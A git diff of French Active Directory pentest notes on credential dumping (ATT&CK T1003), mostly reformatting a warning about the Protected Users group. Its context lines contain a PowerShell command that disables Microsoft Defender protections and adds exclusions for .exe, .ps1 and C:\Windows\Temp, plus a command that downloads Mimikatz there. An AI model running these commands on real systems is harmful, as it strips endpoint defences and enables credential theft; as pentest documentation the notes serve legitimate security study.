@@ -551,8 +551,10 @@ INC.
 > ATT&CK Technique ID : T1003.001-008 <br>
 > Outils : Mimikatz
 
+<br>
 
-Un compte ayant des privilèges élévés sur le domaine doit toujour se trouver dans le **groupe "Protected Users"** (dans l'OU built-in Users) sinon ces identifiants seront stockés en cache lors de sa connexion sur une machine. Il sera possible d'extraire ses informations avec un outils comme Mimikatz.
+> [!IMPORTANT]
+> Un compte ayant des privilèges élévés sur le domaine doit toujour se trouver dans le **groupe "Protected Users"** (dans l'OU built-in Users) sinon ces identifiants seront stockés en cache lors de sa connexion sur une machine. Il sera possible d'extraire ses informations avec un outils comme Mimikatz.
 
 Les informations des identifiants en cache sont stockées dans le registre au sein de la clé : HKEY_LOCAL_MACHINE\Security\Cache
 
@@ -571,17 +573,17 @@ klist
 
 > [!NOTE] Le processus **lsass.exe** (Local Security Authority SubSystem) gère des informations d'identifications qui sont stockées en mémoire.
 
-### Désactiver Defender, ajouter une exclusion pour "C:\Windows\Temp", exclut les extension .exe et .ps1
+### Désactiver Defender, exclusion "C:\Windows\Temp", exclusion des  .exe et .ps1
 ```powershell		
 Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisablePrivacyMode $true -DisableBlockAtFirstSeen $true -ExclusionExtension "ps1", "exe";Add-MpPreference -ExclusionPath "C:\Windows\Temp"
 ```
 
 
 
-### Télécharger mimikatz
-
 ![](img/meme.png)
 
+
+### Télécharger mimikatz
 ```powershell
 Invoke-WebRequest https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -OutFile "C:\Windows\Temp\mimi.zip"
 sl "C:\Windows\Temp"
